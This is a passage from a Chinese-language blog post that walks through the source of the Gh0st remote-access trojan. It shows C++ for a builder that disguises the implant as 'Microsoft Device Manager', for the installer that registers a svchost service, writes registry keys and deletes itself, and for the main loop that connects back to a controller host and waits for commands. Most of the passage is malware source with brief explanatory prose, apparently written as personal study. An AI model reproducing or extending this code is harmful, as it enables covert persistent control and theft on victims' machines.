class="number">100</span>];</span><br><span class="line">	</span><br><span class="line">	<span class="type">char</span> DisplayName[<span class="number">100</span>];</span><br><span class="line">	<span class="built_in">sprintf_s</span>(DisplayName, <span class="string">&quot;Microsoft Device Manager_%02x&quot;</span>, <span class="built_in">rand</span>() % <span class="number">0xff</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="type">char</span> Description[] = <span class="string">&quot;监测和监视新硬件设备并自动更新设备驱动&quot;</span>;</span><br><span class="line">	<span class="built_in">sprintf_s</span>(strServiceConfig, <span class="string">&quot;%s|%s&quot;</span>, <span class="built_in">MyEncode</span>(DisplayName),<span class="built_in">MyEncode</span>(Description));</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> str1[<span class="number">100</span>] = <span class="string">&quot;CCCCCC&quot;</span>;</span><br><span class="line">	<span class="built_in">strcat</span>(str1, strServiceConfig);</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> str2[<span class="number">100</span>] = <span class="string">&quot;AAAAAA&quot;</span>;</span><br><span class="line">	<span class="built_in">strcat</span>(str2, EnInputStr);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, str1);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, str2);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		<span class="type">char</span>* pfile = <span class="literal">NULL</span>;</span><br><span class="line">		FILE* pf = <span class="literal">NULL</span>;</span><br><span class="line">		ULONG_PTR size;</span><br><span class="line">		ULONG_PTR read_size;</span><br><span class="line">		<span class="built_in">fopen_s</span>(&amp;pf, <span class="string">&quot;E:\\study\\Trojan\\Gh0st-vs2019--main\\Gh0st-vs2019--main\\gh0st-vs2019\\gh0st\\res\\install.exe&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (pf == <span class="literal">NULL</span>) <span class="keyword">throw</span> <span class="string">&quot;[-]: fopen wrong&quot;</span>;</span><br><span class="line">		<span class="built_in">fseek</span>(pf, <span class="number">0</span>, SEEK_END);</span><br><span class="line">		size = <span class="built_in">ftell</span>(pf);</span><br><span class="line">		<span class="built_in">fseek</span>(pf, <span class="number">0</span>, SEEK_SET);</span><br><span class="line">		pfile = (<span class="type">char</span>*)<span class="built_in">malloc</span>(size);</span><br><span class="line">		<span class="keyword">if</span> (pfile == <span class="literal">NULL</span>) <span class="keyword">throw</span> <span class="string">&quot;[-]: malloc wrong&quot;</span>;</span><br><span class="line">		read_size = <span class="built_in">fread</span>(pfile, <span class="built_in">sizeof</span>(<span class="type">char</span>), size, pf);</span><br><span class="line">		<span class="keyword">if</span> (read_size != size) <span class="keyword">throw</span> <span class="string">&quot;[-]: fread wrong&quot;</span>;</span><br><span class="line"></span><br><span class="line">		<span class="type">char</span> pathname[<span class="number">200</span>];</span><br><span class="line">		<span class="built_in">sprintf_s</span>(pathname, <span class="string">&quot;E:\\study\\Trojan\\Gh0st-vs2019--main\\Gh0st-vs2019--main\\gh0st-vs2019\\gh0st\\Release\\server\\server_%02x.exe&quot;</span>, <span class="built_in">rand</span>() % <span class="number">0xff</span>);</span><br><span class="line"></span><br><span class="line">		<span class="built_in">fclose</span>(pf);</span><br><span class="line">		pf = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="built_in">fopen_s</span>(&amp;pf, pathname, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (pf == <span class="literal">NULL</span>) <span class="keyword">throw</span> <span class="string">&quot;[-]: fopen wrong&quot;</span>;</span><br><span class="line"></span><br><span class="line">		<span class="built_in">fwrite</span>(pfile, <span class="number">1</span>, size, pf);</span><br><span class="line">		<span class="built_in">fwrite</span>(str1, <span class="number">1</span>, <span class="built_in">strlen</span>(str1) + <span class="number">1</span>, pf);</span><br><span class="line">		<span class="built_in">fwrite</span>(str2, <span class="number">1</span>, <span class="built_in">strlen</span>(str2) + <span class="number">1</span>, pf);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">catch</span> (<span class="type">const</span> <span class="type">char</span>* msg)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, msg);</span><br><span class="line">		DWORD err = <span class="built_in">GetLastError</span>();</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;0x%08x&quot;</span>, err);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">catch</span>(...)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%x&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="MSc7y">服务端部分</h3>
<h4 id="thIjT">install</h4>
install的模板



<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">__declspec(noinline)</span><br><span class="line"><span class="function"><span class="type">int</span> APIENTRY <span class="title">WinMain</span><span class="params">(HINSTANCE hInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">                     HINSTANCE hPrevInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">                     LPSTR     lpCmdLine,</span></span></span><br><span class="line"><span class="params"><span class="function">                     <span class="type">int</span>       nCmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// 让启动程序时的小漏斗马上消失</span></span><br><span class="line">	<span class="built_in">GetInputState</span>();</span><br><span class="line">	<span class="built_in">PostThreadMessage</span>(<span class="built_in">GetCurrentThreadId</span>(),<span class="literal">NULL</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">	MSG	msg;</span><br><span class="line">	<span class="built_in">GetMessage</span>(&amp;msg, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    </span><br><span class="line">	<span class="type">char</span>	*lpEncodeString = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="type">char</span>	*lpServiceConfig = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="type">char</span>	*lpServiceDisplayName = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="type">char</span>	*lpServiceDescription = <span class="literal">NULL</span>;</span><br><span class="line">	lpEncodeString = (<span class="type">char</span> *)<span class="built_in">FindConfigString</span>(hInstance, <span class="string">&quot;AAAAAA&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (lpEncodeString == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;Rrror in FindConfigStringAAAAAA&quot;</span>, <span class="string">&quot;l1pmoluy&quot;</span>, MB_OK);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	lpServiceConfig = (<span class="type">char</span> *)<span class="built_in">FindConfigString</span>(hInstance, <span class="string">&quot;CCCCCC&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (lpServiceConfig == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;Rrror in FindConfigStringCCCCCC&quot;</span>, <span class="string">&quot;l1pmoluy&quot;</span>, MB_OK);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">char</span>* pos = <span class="built_in">strchr</span>(lpServiceConfig, <span class="string">&#x27;|&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span> (pos == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;Rrror in pos&quot;</span>, <span class="string">&quot;l1pmoluy&quot;</span>, MB_OK);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	*pos = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	lpEncodeString = <span class="built_in">MyDecode</span>(lpEncodeString + <span class="number">6</span>);</span><br><span class="line">	lpServiceDisplayName = <span class="built_in">MyDecode</span>(lpServiceConfig + <span class="number">6</span>);</span><br><span class="line">	lpServiceDescription = <span class="built_in">MyDecode</span>(pos + <span class="number">1</span>);</span><br><span class="line">	<span class="keyword">if</span> (lpServiceDisplayName == <span class="literal">NULL</span> || lpServiceDescription == <span class="literal">NULL</span> || lpEncodeString == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;Rrror in MyDecode&quot;</span>, <span class="string">&quot;l1pmoluy&quot;</span>, MB_OK);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span>	*lpServiceName = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="type">char</span>	*lpUpdateArgs = <span class="string">&quot;Gh0st Update&quot;</span>;</span><br><span class="line">	<span class="comment">// 补丁:这里是看文件名字有没有更新(在ini配置中文件定死的)</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">strstr</span>(<span class="built_in">GetCommandLine</span>(), lpUpdateArgs) == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		HANDLE	hMutex = <span class="built_in">CreateMutex</span>(<span class="literal">NULL</span>, <span class="literal">true</span>, lpEncodeString);</span><br><span class="line">		DWORD	dwLastError = <span class="built_in">GetLastError</span>();</span><br><span class="line">		<span class="comment">// 普通权限访问系统权限创建的Mutex,如果存在，如果存在就返回拒绝访问的错误</span></span><br><span class="line">		<span class="comment">// 已经安装过一个一模一样配置的，就不安装了</span></span><br><span class="line">		<span class="keyword">if</span> (dwLastError == ERROR_ALREADY_EXISTS || dwLastError == ERROR_ACCESS_DENIED)</span><br><span class="line">			<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">		<span class="built_in">ReleaseMutex</span>(hMutex);</span><br><span class="line">		<span class="built_in">CloseHandle</span>(hMutex);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// 等待服务端自删除</span></span><br><span class="line">		<span class="built_in">Sleep</span>(<span class="number">5000</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置异常处理</span></span><br><span class="line">	<span class="built_in">SetUnhandledExceptionFilter</span>(bad_exception);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 确保权限</span></span><br><span class="line">	<span class="built_in">SetAccessRights</span>();		<span class="comment">//这里提权显示成功，但是在后续OpenSCManager中仍然存在权限不足提示</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//加载dll到svchost服务中 这里有错误，明明是创建的新服务却显示服务已存在</span></span><br><span class="line">	lpServiceName = <span class="built_in">InstallService</span>(lpServiceDisplayName, lpServiceDescription, lpEncodeString);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (lpServiceName != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// 写安装程序路径到注册表，服务开始后读取并删除</span></span><br><span class="line">		<span class="type">char</span>	strSelf[MAX_PATH];</span><br><span class="line">		<span class="type">char</span>	strSubKey[<span class="number">1024</span>];</span><br><span class="line">		<span class="built_in">memset</span>(strSelf, <span class="number">0</span>, <span class="built_in">sizeof</span>(strSelf));</span><br><span class="line">		<span class="built_in">GetModuleFileName</span>(<span class="literal">NULL</span>, strSelf, <span class="built_in">sizeof</span>(strSelf));</span><br><span class="line">		<span class="built_in">wsprintf</span>(strSubKey, <span class="string">&quot;SYSTEM\\CurrentControlSet\\Services\\%s&quot;</span>, lpServiceName);</span><br><span class="line">		<span class="built_in">WriteRegEx</span>(HKEY_LOCAL_MACHINE, strSubKey, <span class="string">&quot;InstallModule&quot;</span>, REG_SZ, strSelf, <span class="built_in">lstrlen</span>(strSelf), <span class="number">0</span>);</span><br><span class="line">        <span class="comment">//转接dll</span></span><br><span class="line">		<span class="built_in">StartService</span>(lpServiceName);</span><br><span class="line">		<span class="keyword">delete</span> lpServiceName;</span><br><span class="line">		<span class="keyword">delete</span> lpServiceDisplayName;</span><br><span class="line">		<span class="keyword">delete</span> lpServiceDescription;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">ExitProcess</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="kGzUH">svchost</h4>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">main</span><span class="params">(<span class="type">char</span> *lpServiceName)</span></span></span><br><span class="line"><span class="function"><span class="meta">#<span class="keyword">endif</span></span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _CONSOLE</span></span><br><span class="line">	<span class="keyword">if</span> (argc &lt; <span class="number">3</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Usage:\n %s &lt;Host&gt; &lt;Port&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="comment">// lpServiceName,在ServiceMain返回后就没有了</span></span><br><span class="line">	<span class="type">char</span>	strServiceName[<span class="number">256</span>];</span><br><span class="line">	<span class="type">char</span>	strKillEvent[<span class="number">50</span>];</span><br><span class="line">	HANDLE	hInstallMutex = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> GH_DLL</span></span><br><span class="line">	<span class="type">char</span>	*lpURL = (<span class="type">char</span> *)<span class="built_in">FindConfigString</span>(CKeyboardManager::g_hInstance, <span class="string">&quot;AAAAAA&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (lpURL == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//////////////////////////////////////////////////////////////////////////</span></span><br><span class="line">	<span class="comment">// Set Window Station</span></span><br><span class="line">	HWINSTA hOldStation = <span class="built_in">GetProcessWindowStation</span>();</span><br><span class="line">	HWINSTA hWinSta = <span class="built_in">OpenWindowStation</span>(<span class="string">&quot;winsta0&quot;</span>, FALSE, MAXIMUM_ALLOWED);</span><br><span class="line">	<span class="keyword">if</span> (hWinSta != <span class="literal">NULL</span>)</span><br><span class="line">		<span class="built_in">SetProcessWindowStation</span>(hWinSta);</span><br><span class="line">	<span class="comment">//</span></span><br><span class="line">	<span class="comment">//////////////////////////////////////////////////////////////////////////</span></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (CKeyboardManager::g_hInstance != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">SetUnhandledExceptionFilter</span>(bad_exception);</span><br><span class="line">		</span><br><span class="line">		<span class="built_in">lstrcpy</span>(strServiceName, lpServiceName);</span><br><span class="line">		<span class="built_in">wsprintf</span>(strKillEvent, <span class="string">&quot;Global\\Gh0st %d&quot;</span>, <span class="built_in">GetTickCount</span>()); <span class="comment">// 随机事件名</span></span><br><span class="line"></span><br><span class="line">		hInstallMutex = <span class="built_in">CreateMutex</span>(<span class="literal">NULL</span>, <span class="literal">true</span>, lpURL);</span><br><span class="line">		<span class="built_in">ReConfigService</span>(strServiceName);</span><br><span class="line">		<span class="comment">// 删除安装文件 实现自隐藏</span></span><br><span class="line">		<span class="built_in">DeleteInstallFile</span>(lpServiceName);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="comment">// 告诉操作系统:如果没有找到CD/floppy disc,不要弹窗口吓人</span></span><br><span class="line">	<span class="built_in">SetErrorMode</span>( SEM_FAILCRITICALERRORS);</span><br><span class="line">	<span class="type">char</span>	*lpszHost = <span class="literal">NULL</span>;</span><br><span class="line">	DWORD	dwPort = <span class="number">80</span>;</span><br><span class="line">	<span class="type">char</span>	*lpszProxyHost = <span class="literal">NULL</span>;</span><br><span class="line">	DWORD	dwProxyPort = <span class="number">0</span>;</span><br><span class="line">	<span class="type">char</span>	*lpszProxyUser = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="type">char</span>	*lpszProxyPass = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	HANDLE	hEvent = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	CClientSocket socketClient;</span><br><span class="line">	BYTE	bBreakError = NOT_CONNECT; <span class="comment">// 断开连接的原因,初始化为还没有连接</span></span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (bBreakError != NOT_CONNECT &amp;&amp; bBreakError != HEARTBEATTIMEOUT_ERROR)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2000</span>; i++)</span><br><span class="line">			&#123;</span><br><span class="line">				hEvent = <span class="built_in">OpenEvent</span>(EVENT_ALL_ACCESS, <span class="literal">false</span>, strKillEvent);</span><br><span class="line">				<span class="keyword">if</span> (hEvent != <span class="literal">NULL</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					socketClient.<span class="built_in">Disconnect</span>();</span><br><span class="line">					<span class="built_in">CloseHandle</span>(hEvent);</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">					</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="built_in">Sleep</span>(<span class="number">60</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> GH_DLL</span></span><br><span class="line">		<span class="comment">// 上线间隔为2分, 前6个&#x27;A&#x27;是标志</span></span><br><span class="line">		<span class="keyword">if</span> (!<span class="built_in">getLoginInfo</span>(<span class="built_in">MyDecode</span>(lpURL + <span class="number">6</span>), &amp;lpszHost, &amp;dwPort, &amp;lpszProxyHost, </span><br><span class="line">				&amp;dwProxyPort, &amp;lpszProxyUser, &amp;lpszProxyPass))</span><br><span class="line">		&#123;</span><br><span class="line">			bBreakError = GETLOGINFO_ERROR;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">		lpszHost = argv[<span class="number">1</span>];</span><br><span class="line">		dwPort = <span class="built_in">atoi</span>(argv[<span class="number">2</span>]);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">		<span class="keyword">if</span> (lpszProxyHost != <span class="literal">NULL</span>)</span><br><span class="line">			socketClient.<span class="built_in">setGlobalProxyOption</span>(PROXY_SOCKS_VER5, lpszProxyHost, dwProxyPort, lpszProxyUser, lpszProxyPass);</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			socketClient.<span class="built_in">setGlobalProxyOption</span>();</span><br><span class="line"></span><br><span class="line">		DWORD dwTickCount = <span class="built_in">GetTickCount</span>();</span><br><span class="line">        <span class="comment">//连接</span></span><br><span class="line"> 		<span class="keyword">if</span> (!socketClient.<span class="built_in">Connect</span>(lpszHost, dwPort))</span><br><span class="line">		&#123;</span><br><span class="line">			bBreakError = CONNECT_ERROR;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 登录</span></span><br><span class="line">		DWORD dwExitCode = SOCKET_ERROR;</span><br><span class="line">		<span class="built_in">sendLoginInfo</span>(strServiceName, &amp;socketClient, <span class="built_in">GetTickCount</span>() - dwTickCount);</span><br><span class="line">        <span class="comment">//初始化manager</span></span><br><span class="line">		<span class="function">CKernelManager	<span class="title">manager</span><span class="params">(&amp;socketClient, strServiceName, g_dwServiceType, strKillEvent, lpszHost, dwPort)</span></span>;</span><br><span class="line">		socketClient.<span class="built_in">setManagerCallBack</span>(&amp;manager);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 等待控制端发送激活命令，超时为10秒，重新连接,以防连接错误</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; (i &lt; <span class="number">10</span> &amp;&amp; !manager.<span class="built_in">IsActived</span>()); i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">Sleep</span>(<span class="number">1000</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 10秒后还没有收到控制端发来的激活命令，说明对方不是控制端，重新连接</span></span><br><span class="line">		<span class="keyword">if</span> (!manager.<span class="built_in">IsActived</span>())</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">		DWORD	dwIOCPEvent;</span><br><span class="line">		dwTickCount = <span class="built_in">GetTickCount</span>();</span><br><span class="line"></span><br><span class="line">		<span class="keyword">do</span></span><br><span class="line">		&#123;</span><br><span class="line">			hEvent = <span class="built_in">OpenEvent</span>(EVENT_ALL_ACCESS, <span class="literal">false</span>, strKillEvent);</span><br><span class="line">			dwIOCPEvent = <span class="built_in">WaitForSingleObject</span>(socketClient.m_hEvent, <span class="number">100</span>);</span><br><span class="line">			<span class="built_in">Sleep</span>(<span class="number">500</span>);</span><br><span class="line">		&#125; <span class="keyword">while</span>(hEvent == <span class="literal">NULL</span> &amp;&amp; dwIOCPEvent != WAIT_OBJECT_0);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (hEvent != <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			socketClient.<span class="built_in">Disconnect</span>();</span><br><span class="line">			<span class="built_in">CloseHandle</span>(hEvent);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> GH_DLL</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="built_in">SetErrorMode</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="built_in">ReleaseMutex</span>(hInstallMutex);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(hInstallMutex);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>刚注册进来 系统调用ServiceMain ServiceMain简单完善一下后续 然后开线程调用main</p>
<p>main将端口号解密出来 判断是否唯一 给自己提一个端口权限 然后重新注册一个服务 把install删了</p>
<p>后面把加密后的端口弄出来 然后先连随便一个网站 然后解密出来端口号等信息后面登录 在登录<code>socketClient.Connect</code>中 会有新线程产生 也就是工作线程</p>
<p><code>m_hWorkerThread = (HANDLE)MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, (LPVOID)this, 0, NULL, true);</code></p>
<p>工作线程先接受socket 这里在没有发socket的时候会阻塞住 接受到之后就开始解析 具体逻辑还要往里进看OnRead</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">WorkThread	堵塞等待接收socket</span><br><span class="line">|</span><br><span class="line">OnRead			判断socket是否为客户端发来的，并解包</span><br><span class="line">|</span><br><span class="line">Manager-&gt;OnReceive	调用Manager下的OnReceive</span><br></pre></td></tr></table></figure>



<p>这里的Manager取决与前文中登录后的</p>
<p><code>CKernelManager manager(&amp;socketClient, strServiceName, g_dwServiceType, strKillEvent, lpszHost, dwPort);</code></p>
<p><code>socketClient.setManagerCallBack(&amp;manager);</code></p>
<p>这里实现的便是设置Manager为KernelManager<br>    所以这里调用的OnReceive就是分发Manager</p>
